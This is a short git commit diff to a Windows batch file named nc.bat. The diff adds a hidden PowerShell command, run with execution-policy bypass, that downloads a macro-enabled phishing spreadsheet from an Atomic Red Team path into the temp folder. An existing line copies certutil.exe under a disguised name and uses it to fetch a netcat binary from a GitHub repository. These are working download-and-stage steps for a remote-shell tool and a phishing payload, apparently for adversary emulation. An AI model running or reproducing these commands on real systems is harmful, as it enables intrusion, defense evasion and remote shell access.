95d6d22ba545205f27e288dd0995e7cadafaeca3
inwestallis <inwestallis@gmail.com>
2020-04-24 10:55:05 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,6 +1,8 @@
 @echo on
 
+powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true','%Temp%\s.xlsm')"
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
+
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
 
